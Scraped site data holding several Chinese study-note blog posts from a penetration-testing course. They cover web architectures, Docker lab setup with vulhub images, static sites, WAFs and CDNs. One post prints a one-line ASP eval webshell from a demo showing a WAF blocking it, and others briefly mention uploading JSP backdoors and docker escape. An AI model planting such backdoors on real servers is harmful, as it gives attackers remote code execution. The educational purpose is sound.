CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"网站架构： 上节课内容 常规化搭建 站库分离 前后端分离 软件式搭建网站/集成化环境",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第38天\n\nWeb架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 网站架构：\n   * 上节课内容\n   * 常规化搭建\n   * 站库分离\n * 前后端分离\n * 软件式搭建网站/集成化环境\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第20章：基础入门-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n\n# 网站架构：\n\n\n> # 上节课内容\n> \n> \n> # 常规化搭建\n> \n> 原理：源码数据都在同服务器\n> \n> 影响：无，常规安全测试手法\n> \n> \n> # 站库分离\n> \n> 原理：源码数据库不在同服务器\n> \n> 存储：其他服务器上数据库&云数据库产品\n> \n> 影响：数据被单独存放，能连接才可影响数据\n\n\n# 前后端分离\n\n**原理：**前端JS框架，API传输数据\n\n影响：\n\n 1. 前端页面大部分不存在漏洞\n    \n    原因：js、html是前端语言，php、java、.net称之为后端语言，知名框架是VUE，很少有漏洞，不会有代码逻辑性漏洞，只负责显示部分。\n\n 2. 后端管理大部分不在同域名\n    \n    原因：后端管理系统是在另一个地方，需要信息搜集，常规的扫描目录的方式找不到后台。\n\n 3. 获得权限可能不影响后端\n    \n    原因：域名不同，后端和前端可能不在同一台服务器上。如果是子域名的话，有一定可能在同一台服务器上。\n\n典型前端页面：【RXThinkCMF官网-基于 PHP 语言的敏捷开发框架】\n\n**特点：**前台只负责显示，数据传输通过接口访问后台\n\n\n\n图中这种就是典型的前后端分离网站， 用图中介绍的技术搭建的网站也是前后端分离的，以后见到的相同风格的网站极有可能是前后端分离的。\n\n**渗透思路：**如果能找到后端的地址，就去测试后端，如果找不到的话，尝试针对框架的历史漏洞进行分析。如果都不行的话，可能就需要从社工方面找漏洞。\n\n\n# 软件式搭建网站/集成化环境\n\n宝塔+phpstudy\n\n搭建的工作是枯燥且重复的，这种软件被设计出来就是为了解决这个问题的。\n\n**缺点：**搭建虽然方便了，但也给渗透测试带来了一定区别，最大的区别在网站权限方面\n\n视频中演示了宝塔的搭建方式，用宝塔搭建的基本都是php网站，java、python的网站比较少\n\n会点鼠标的猴子就会用宝塔面板，搭建过程不再赘述\n\n搭建完成后模拟攻击者的视角，看这样搭建的网站和常规搭建的网站有什么差异：",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第38天\n\nweb架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 网站架构：\n   * 上节课内容\n   * 常规化搭建\n   * 站库分离\n * 前后端分离\n * 软件式搭建网站/集成化环境\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第20章：基础入门-web架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n\n# 网站架构：\n\n\n> # 上节课内容\n> \n> \n> # 常规化搭建\n> \n> 原理：源码数据都在同服务器\n> \n> 影响：无，常规安全测试手法\n> \n> \n> # 站库分离\n> \n> 原理：源码数据库不在同服务器\n> \n> 存储：其他服务器上数据库&云数据库产品\n> \n> 影响：数据被单独存放，能连接才可影响数据\n\n\n# 前后端分离\n\n**原理：**前端js框架，api传输数据\n\n影响：\n\n 1. 前端页面大部分不存在漏洞\n    \n    原因：js、html是前端语言，php、java、.net称之为后端语言，知名框架是vue，很少有漏洞，不会有代码逻辑性漏洞，只负责显示部分。\n\n 2. 后端管理大部分不在同域名\n    \n    原因：后端管理系统是在另一个地方，需要信息搜集，常规的扫描目录的方式找不到后台。\n\n 3. 获得权限可能不影响后端\n    \n    原因：域名不同，后端和前端可能不在同一台服务器上。如果是子域名的话，有一定可能在同一台服务器上。\n\n典型前端页面：【rxthinkcmf官网-基于 php 语言的敏捷开发框架】\n\n**特点：**前台只负责显示，数据传输通过接口访问后台\n\n\n\n图中这种就是典型的前后端分离网站， 用图中介绍的技术搭建的网站也是前后端分离的，以后见到的相同风格的网站极有可能是前后端分离的。\n\n**渗透思路：**如果能找到后端的地址，就去测试后端，如果找不到的话，尝试针对框架的历史漏洞进行分析。如果都不行的话，可能就需要从社工方面找漏洞。\n\n\n# 软件式搭建网站/集成化环境\n\n宝塔+phpstudy\n\n搭建的工作是枯燥且重复的，这种软件被设计出来就是为了解决这个问题的。\n\n**缺点：**搭建虽然方便了，但也给渗透测试带来了一定区别，最大的区别在网站权限方面\n\n视频中演示了宝塔的搭建方式，用宝塔搭建的基本都是php网站，java、python的网站比较少\n\n会点鼠标的猴子就会用宝塔面板，搭建过程不再赘述\n\n搭建完成后模拟攻击者的视角，看这样搭建的网站和常规搭建的网站有什么差异：",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024129CTF学习笔记25",frontmatter:{title:"2024129CTF学习笔记25",date:"2024-12-29T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-29-CTFLearn.html",relativePath:"views/numerology/2024-12-29-CTFLearn.md",key:"v-a2f84c70",path:"/views/numerology/2024-12-29-CTFLearn.html",headers:[{level:2,title:"Docker容器建站",slug:"docker容器建站",normalizedTitle:"docker容器建站",charIndex:169}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第41天</p>\n<p>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"Docker容器建站",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第41天\n\nWeb架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * Docker容器建站\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n\n# Docker容器建站\n\n**原理：**虚拟化技术，将网站、搭建环境封装成镜像，用docker技术拉取、还原。\n\n官网：【链接】\n\n**重点：**需要明白的是，我们只是复现了环境，从安全的角度去考虑漏洞，不是系统的学习这些技术\n\n建站步骤：\n\n 1. 安装Docker，教程可以看【w3cschool的Docker安装教程】\n\n 2. 拉取镜像\n    \n    # 拉取镜像\n    docker pull vulhub/tomcat:8.0\n    \n    # 列出本地所有镜像\n    docker images\n    docker image ls\n    \n    # 上条命令的回显内容\n    \n    REPOSITORY    TAG                IMAGE ID       CREATED         SIZE\n    tomcat        latest             fb5657adc892   19 months ago   680MB\n    hello-world   latest             feb5d9fea6a5   22 months ago   13.3kB\n    redis         5.0.9-alpine3.11   3661c84ee9d0   3 years ago     29.8MB\n     \n    REPOSITORY   # 镜像的仓库源\n    TAG          # 镜像的标签\n    IMAGE ID     # 镜像的id\n    CREATED      # 镜像的创建时间\n    SIZE         # 镜像的大小\n    \n    # 启动 端口是8080，是用自己的8080映射出对外的8080\n    docker run -it -d -p 8080:8080 vulhub/tomcat\n    \n    # 启动之后可以在外部浏览器访问该ip地址的8080端口，比如视频中的\n    http://47.94.236.117:8080\n    \n    # 可以结束运行\n    docker stop vulhub/tomcat\n    \n    # 可以进入容器\n    cd vulhub/tomcat/tomcat8/\n    docker-compose up -d\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n渗透测试：\n\n 1. 用狐狸的工具箱生成java后门，用的应该是jsp后门，将后门上传到服务器\n 2. 通过WebShell工具可以连接后门，发现权限是root，目录、文件权限都能看到\n 3. 事实上，这里展示的目录是虚拟的，并不是服务器的权限。通过docker逃逸技术可以获取真正的服务器权限",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第41天\n\nweb架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * docker容器建站\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-web架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n\n# docker容器建站\n\n**原理：**虚拟化技术，将网站、搭建环境封装成镜像，用docker技术拉取、还原。\n\n官网：【链接】\n\n**重点：**需要明白的是，我们只是复现了环境，从安全的角度去考虑漏洞，不是系统的学习这些技术\n\n建站步骤：\n\n 1. 安装docker，教程可以看【w3cschool的docker安装教程】\n\n 2. 拉取镜像\n    \n    # 拉取镜像\n    docker pull vulhub/tomcat:8.0\n    \n    # 列出本地所有镜像\n    docker images\n    docker image ls\n    \n    # 上条命令的回显内容\n    \n    repository    tag                image id       created         size\n    tomcat        latest             fb5657adc892   19 months ago   680mb\n    hello-world   latest             feb5d9fea6a5   22 months ago   13.3kb\n    redis         5.0.9-alpine3.11   3661c84ee9d0   3 years ago     29.8mb\n     \n    repository   # 镜像的仓库源\n    tag          # 镜像的标签\n    image id     # 镜像的id\n    created      # 镜像的创建时间\n    size         # 镜像的大小\n    \n    # 启动 端口是8080，是用自己的8080映射出对外的8080\n    docker run -it -d -p 8080:8080 vulhub/tomcat\n    \n    # 启动之后可以在外部浏览器访问该ip地址的8080端口，比如视频中的\n    http://47.94.236.117:8080\n    \n    # 可以结束运行\n    docker stop vulhub/tomcat\n    \n    # 可以进入容器\n    cd vulhub/tomcat/tomcat8/\n    docker-compose up -d\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n渗透测试：\n\n 1. 用狐狸的工具箱生成java后门，用的应该是jsp后门，将后门上传到服务器\n 2. 通过webshell工具可以连接后门，发现权限是root，目录、文件权限都能看到\n 3. 事实上，这里展示的目录是虚拟的，并不是服务器的权限。通过docker逃逸技术可以获取真正的服务器权限",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024130CTF学习笔记26",frontmatter:{title:"2024130CTF学习笔记26",date:"2024-12-30T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-30-CTFLearn.html",relativePath:"views/numerology/2024-12-30-CTFLearn.md",key:"v-16c36218",path:"/views/numerology/2024-12-30-CTFLearn.html",headers:[{level:2,title:"建站分配站",slug:"建站分配站",normalizedTitle:"建站分配站",charIndex:169},{level:2,title:"前后端分离建站",slug:"前后端分离建站",normalizedTitle:"前后端分离建站",charIndex:178},{level:2,title:"静态Web",slug:"静态web",normalizedTitle:"静态web",charIndex:189}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第42天</p>\n<p>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"建站分配站 前后端分离建站 静态Web",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第42天\n\nWeb架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 建站分配站\n * 前后端分离建站\n * 静态Web\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n\n# 建站分配站\n\n情况分类：\n\n 1. 托管模式\n    \n    举例：政务门户、政务网站\n    \n    特点：托管到互联网公司，但备案信息是甲方公司的\n\n 2. 申请类网站\n    \n    举例：【凡科建站】可以自行在网站上设计，更改信息。域名是凡科分配的\n    \n    特点：对这类网站进行渗透的时候，测试的是建站平台的，而不是网站本身的\n    \n    如何辨认：信息搜集时，备案查询不匹配，或者域名是公用的\n\n\n# 前后端分离建站\n\n> 当小迪讲到这部分的时候，感触颇多，当年在北京的日子，做的就是前后端分离的网站，我做的就是Java后端开发，实习1年加转正半年，同事们都很好，尤其是我的师父，真的教给我很多东西。\n\n**重点：**前台显示东西，后端是另外一套负责处理，造成安全测试的差异，在前后端中漏洞和常规方式不同，或者位置不同。\n\n**特点：**访问速度快、安全、数据是通过API传输的，大量数据传输跟不上\n\n**总结：**每个网站都是根据用户的需求、功能来定制的，由于他们不一样导致我们面临不一样的结果，所以安全方面也不同，有些人完全外行但搭建的网站是安全的，因为他用的产品是安全的；有些专业安全的人员搭建的网站却不安全，因为用的产品不安全；具体对比php和java，java要对比php安全一点\n\n\n# 静态Web\n\n> 静态网站",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第42天\n\nweb架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 建站分配站\n * 前后端分离建站\n * 静态web\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-web架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n\n# 建站分配站\n\n情况分类：\n\n 1. 托管模式\n    \n    举例：政务门户、政务网站\n    \n    特点：托管到互联网公司，但备案信息是甲方公司的\n\n 2. 申请类网站\n    \n    举例：【凡科建站】可以自行在网站上设计，更改信息。域名是凡科分配的\n    \n    特点：对这类网站进行渗透的时候，测试的是建站平台的，而不是网站本身的\n    \n    如何辨认：信息搜集时，备案查询不匹配，或者域名是公用的\n\n\n# 前后端分离建站\n\n> 当小迪讲到这部分的时候，感触颇多，当年在北京的日子，做的就是前后端分离的网站，我做的就是java后端开发，实习1年加转正半年，同事们都很好，尤其是我的师父，真的教给我很多东西。\n\n**重点：**前台显示东西，后端是另外一套负责处理，造成安全测试的差异，在前后端中漏洞和常规方式不同，或者位置不同。\n\n**特点：**访问速度快、安全、数据是通过api传输的，大量数据传输跟不上\n\n**总结：**每个网站都是根据用户的需求、功能来定制的，由于他们不一样导致我们面临不一样的结果，所以安全方面也不同，有些人完全外行但搭建的网站是安全的，因为他用的产品是安全的；有些专业安全的人员搭建的网站却不安全，因为用的产品不安全；具体对比php和java，java要对比php安全一点\n\n\n# 静态web\n\n> 静态网站",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024131CTF学习笔记27",frontmatter:{title:"2024131CTF学习笔记27",date:"2024-12-31T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-31-CTFLearn.html",relativePath:"views/numerology/2024-12-31-CTFLearn.md",key:"v-77ce0e76",path:"/views/numerology/2024-12-31-CTFLearn.html",headers:[{level:2,title:"今天跨年！祝大家新年快乐！万事如意！",slug:"今天跨年-祝大家新年快乐-万事如意",normalizedTitle:"今天跨年！祝大家新年快乐！万事如意！",charIndex:169},{level:2,title:"静态Web",slug:"静态web",normalizedTitle:"静态web",charIndex:191},{level:2,title:"伪静态Web",slug:"伪静态web",normalizedTitle:"伪静态web",charIndex:200},{level:3,title:"原理：",slug:"原理",normalizedTitle:"原理：",charIndex:212},{level:2,title:"思维导图",slug:"思维导图",normalizedTitle:"思维导图",charIndex:219}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第43天</p>\n<p>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"今天跨年！祝大家新年快乐！万事如意！ 静态Web 伪静态Web 原理： 思维导图",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第43天\n\nWeb架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 今天跨年！祝大家新年快乐！万事如意！\n * 静态Web\n * 伪静态Web\n   * 原理：\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n\n# 今天跨年！祝大家新年快乐！万事如意！\n\nbilibili的2025跨晚挺好看的\n\n\n# 静态Web\n\n**理解：**大学时期学的HTML设计的网站，不会根据用户的交互行为产生改变\n\n举例：\n\n 1. 如果我们要修改某个网站的页面，比如标题、图片等，像是其他方式的建站，就是去后台管理系统中修改。但静态页面是在HTML文件中去修改。\n 2. 就像是传奇之类的广告页面，整个页面只有“成龙”让你砍一刀，然后只有一个进入按钮的、单页面的就是静态网站。\n\n**区分：**看页面的复杂程度，界面显示很乱，没有导航、分栏、搜索等。\n\n**原理：**数据没有传输性（js传输不算）\n\n**影响：**无漏洞\n\n\n# 伪静态Web\n\n\n# 原理：\n\n视频中演示用Z-blog创建文章，应该是可以将这个文章生成一个html，在浏览器访问html页面。在应用中心有“强制伪静态跳转”来伪装。\n\n\n# 思维导图\n\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第43天\n\nweb架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 今天跨年！祝大家新年快乐！万事如意！\n * 静态web\n * 伪静态web\n   * 原理：\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第21章：基础入门-web架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n\n# 今天跨年！祝大家新年快乐！万事如意！\n\nbilibili的2025跨晚挺好看的\n\n\n# 静态web\n\n**理解：**大学时期学的html设计的网站，不会根据用户的交互行为产生改变\n\n举例：\n\n 1. 如果我们要修改某个网站的页面，比如标题、图片等，像是其他方式的建站，就是去后台管理系统中修改。但静态页面是在html文件中去修改。\n 2. 就像是传奇之类的广告页面，整个页面只有“成龙”让你砍一刀，然后只有一个进入按钮的、单页面的就是静态网站。\n\n**区分：**看页面的复杂程度，界面显示很乱，没有导航、分栏、搜索等。\n\n**原理：**数据没有传输性（js传输不算）\n\n**影响：**无漏洞\n\n\n# 伪静态web\n\n\n# 原理：\n\n视频中演示用z-blog创建文章，应该是可以将这个文章生成一个html，在浏览器访问html页面。在应用中心有“强制伪静态跳转”来伪装。\n\n\n# 思维导图\n\n",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250101CTF学习笔记28",frontmatter:{title:"20250101CTF学习笔记28",date:"2025-01-01T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-01-CTFLearn.html",relativePath:"views/numerology/2025-01-01-CTFLearn.md",key:"v-66a4ea7e",path:"/views/numerology/2025-01-01-CTFLearn.html",headers:[{level:2,title:"工具推荐：",slug:"工具推荐",normalizedTitle:"工具推荐：",charIndex:134},{level:2,title:"整体代入",slug:"整体代入",normalizedTitle:"整体代入",charIndex:143},{level:2,title:"WAF",slug:"waf",normalizedTitle:"waf",charIndex:151}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第44天</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"工具推荐： 整体代入 WAF",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第44天\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 工具推荐：\n * 整体代入\n * WAF\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n# 工具推荐：\n\nAnyTXTSearcher：可以对电脑所有文本进行全文搜索，有时候记不起文件名，只记得关键词或者一句话，那AnyTXT会帮你立刻找到，速度极快，而且右边可以直接预览文本，还支持筛选、复制、翻译等。\n\n\n# 整体代入\n\n标题这五个内容是我们在网站架构中可能会出现的五种情况，我们需要看这五种情况在出现以后会对我们的渗透测试产生什么影响\n\n\n# WAF\n\n全名：Web Application Firewall，即 Web 应用防火墙\n\n**原理：**Web应用防火墙，旨在提供保护\n\n**影响：**常规Web安全测试\n\n分类：\n\n\n\n以前面三个最为常见，在公司产品中以硬件为主，个人使用以软件为主，还有云厂商提供WAF服务\n\n**举例：**只有免费例子Windows2012+IIS+D盾\n\n> 『D盾_防火墙』专为IIS设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵,在正常运行各类网站的情 况下，越少的功能，服务器越安全的理念而设计！ 限制了常见的入侵方法，让服务器更安全!\n\n\n\n视频中演示的过程是在网站中做了个后门，具体是一个asp后门，内容为\n\n<%eval request("pass")%>\n\n\n1\n\n\n无WAF情况：\n\n尝试在没有WAF的情况下访问网站，进入1.asp页面，发现是可以访问到的。\n\n然后用WebShell工具连接后门，连接密码是后门中的pass，看到是可以正常连接的。\n\n开启WAF后：\n\n也就是点击软件中的“安装D盾防护”，稍等即弹出安装成功。\n\n\n\n此时访问页面时，会提示“禁止脚本的访问，如有疑问，请和管理员联系”。\n\n\n\n用WebShell工具连接时，发现提示“初始化失败”，无法连接。\n\n结论：\n\n 1. WAF是我们可以在服务器网站上的安全保护程序，类似我们电脑上的杀毒软件，开启对网站和服务器的保护。像D盾有非常多常规Web攻击手段的拦截，包括后门，可以在相应设置中开启。\n 2. 在以后可能碰到有WAF防护的这种网站，有很多种类的WAF，而WAF绕过是钻空子的方法，只针对防护能力较差的WAF。大公司的WAF基本都绕过不了，能绕过的都基本是没有作用的绕过，没有什么意义。',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第44天\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 工具推荐：\n * 整体代入\n * waf\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-web架构&oss存储&负载均衡&cdn加速&反向代理&waf防护\n\n\n# 工具推荐：\n\nanytxtsearcher：可以对电脑所有文本进行全文搜索，有时候记不起文件名，只记得关键词或者一句话，那anytxt会帮你立刻找到，速度极快，而且右边可以直接预览文本，还支持筛选、复制、翻译等。\n\n\n# 整体代入\n\n标题这五个内容是我们在网站架构中可能会出现的五种情况，我们需要看这五种情况在出现以后会对我们的渗透测试产生什么影响\n\n\n# waf\n\n全名：web application firewall，即 web 应用防火墙\n\n**原理：**web应用防火墙，旨在提供保护\n\n**影响：**常规web安全测试\n\n分类：\n\n\n\n以前面三个最为常见，在公司产品中以硬件为主，个人使用以软件为主，还有云厂商提供waf服务\n\n**举例：**只有免费例子windows2012+iis+d盾\n\n> 『d盾_防火墙』专为iis设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵,在正常运行各类网站的情 况下，越少的功能，服务器越安全的理念而设计！ 限制了常见的入侵方法，让服务器更安全!\n\n\n\n视频中演示的过程是在网站中做了个后门，具体是一个asp后门，内容为\n\n<%eval request("pass")%>\n\n\n1\n\n\n无waf情况：\n\n尝试在没有waf的情况下访问网站，进入1.asp页面，发现是可以访问到的。\n\n然后用webshell工具连接后门，连接密码是后门中的pass，看到是可以正常连接的。\n\n开启waf后：\n\n也就是点击软件中的“安装d盾防护”，稍等即弹出安装成功。\n\n\n\n此时访问页面时，会提示“禁止脚本的访问，如有疑问，请和管理员联系”。\n\n\n\n用webshell工具连接时，发现提示“初始化失败”，无法连接。\n\n结论：\n\n 1. waf是我们可以在服务器网站上的安全保护程序，类似我们电脑上的杀毒软件，开启对网站和服务器的保护。像d盾有非常多常规web攻击手段的拦截，包括后门，可以在相应设置中开启。\n 2. 在以后可能碰到有waf防护的这种网站，有很多种类的waf，而waf绕过是钻空子的方法，只针对防护能力较差的waf。大公司的waf基本都绕过不了，能绕过的都基本是没有作用的绕过，没有什么意义。',charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250102CTF学习笔记29",frontmatter:{title:"20250102CTF学习笔记29",date:"2025-01-02T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-02-CTFLearn.html",relativePath:"views/numerology/2025-01-02-CTFLearn.md",key:"v-2c56ac00",path:"/views/numerology/2025-01-02-CTFLearn.html",headers:[{level:2,title:"CDN",slug:"cdn",normalizedTitle:"cdn",charIndex:55}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第45天</p>\n<p>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"CDN",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第45天\n\nWeb架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * CDN\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第22章：基础入门-Web架构&OSS存储&负载均衡&CDN加速&反向代理&WAF防护\n\n\n# CDN\n\n**现象：**外地访问，尤其是海外访问的时候，会出现访问太慢的情况，为了解决这个问题所以产生了CDN\n\n**原理：**内容分发服务，旨在提高网站访问速度，在CDN选择区域内分布多个节点，提高访问速度。比如选择全球，会在全球分布各种节点，如果我们开通一个CDN，真实地址是在湖北，如果在北京访问，会访问CDN北京节点。\n\n**举例：**就像百度等大厂会有CDN技术的应用，在全国乃至全球访问百度都不会有太大的速度差异。\n\n\n\n**影响：**隐藏了真实的IP地址，导致目标测试错误\n\n**演示：**Windows2012+BT宝塔面板+CDN服务\n\n 1. 